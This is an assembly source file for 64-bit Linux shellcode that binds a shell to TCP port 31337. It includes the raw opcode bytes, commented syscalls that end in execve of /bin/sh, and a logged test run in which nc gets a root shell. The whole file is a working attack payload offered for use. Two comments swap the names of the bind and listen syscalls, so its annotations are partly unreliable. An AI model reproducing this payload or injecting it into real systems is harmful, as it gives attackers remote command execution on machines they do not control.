; 103 Bytes long shellcode
; TCP Bind shell on port 31337

; 	$ sudo ./test_shellcode "$(cat bind_shell)"
;	Trying 103 bytes long shellcode ..

;	$ nc -vvv 127.0.0.1 31337
;	Connection to 127.0.0.1 31337 port [tcp/*] succeeded!
;	whoami
;	root
;	pwd
;	/home/root/Workspace

;  6a 29 58 6a 02 5f 6a 01  5e 99 0f 05 48 89 c7 6a
;  31 58 48 31 d2 52 66 c7  44 24 02 7a 69 c6 04 24
;  02 54 5e b2 10 0f 05 6a  32 58 40 b6 04 0f 05 b0
;  2b 48 31 f6 48 31 d2 0f  05 48 89 c7 48 31 c0 6a
;  03 5e 48 ff ce b0 21 0f  05 75 f7 6a 3b 58 48 31
;  f6 48 31 d2 48 bf 2f 2f  62 69 6e 2f 73 68 48 c1
;  ef 08 57 54 5f 0f 05

BITS 64

global _start
section .text

_start:
	; socket(AF_INET, SOCK_STREAM, 0) -> C
	push BYTE 0x29				; sys_socket systemcall
	pop rax					; is number 41 (0x29)
	push BYTE 0x2
	pop rdi					; IP protocol family
	push BYTE 0x1
	pop rsi					; stream socket
	cdq					; default protocol
	syscall

	mov rdi,rax				; save and store socket fd in rdi for reuse

	; bind(s, [2, 31337, 0], 16)
	push BYTE 0x31				; sys_listen systemcall
	pop rax					; is number 49 (0x31)
	xor rdx,rdx
	push rdx				; SIN_ADDR = ANY
	mov WORD [rsp+2], 0x697a		; PORT = 31337 (0x697a)
	mov BYTE [rsp], 0x2			; FAMILY = AF_INET (2)
	push rsp				; pointer to
	pop rsi					; sockaddr structure
	mov BYTE dl,0x10			; addrlen = 16
	syscall

	; listen(s, 4)
	push 0x32
	pop rax					; sys_bind systemcall is number 50 (0x32)
	mov sil, 0x4				; backlog = 4
	syscall

	; accept(s, 0, 0)
	mov BYTE al, 0x2b			; sys_accept systemcall is 43 (0x2B)
	xor rsi,rsi
	xor rdx,rdx
	syscall					; returns the connected socket fd

	;dup2(s, fd) for stdin, stdout and stderr
	mov rdi,rax				; fp to connected socket
	xor rax,rax
	push 0x3
	pop rsi	
	
dup_loop:
	dec rsi
	mov al, 0x21
	syscall

	jnz dup_loop

	;execve("/bin/sh", 0, 0)
	push 0x3b
	pop rax					; sys_execve
	xor rsi,rsi
	xor rdx,rdx
	mov rdi, 0x68732f6e69622f2f		; "hs/nib//"
	shr rdi, 0x8				; "\0hs/nib/"
	push rdi
	push rsp
	pop rdi					; pointer to "/bin/sh"
	syscall
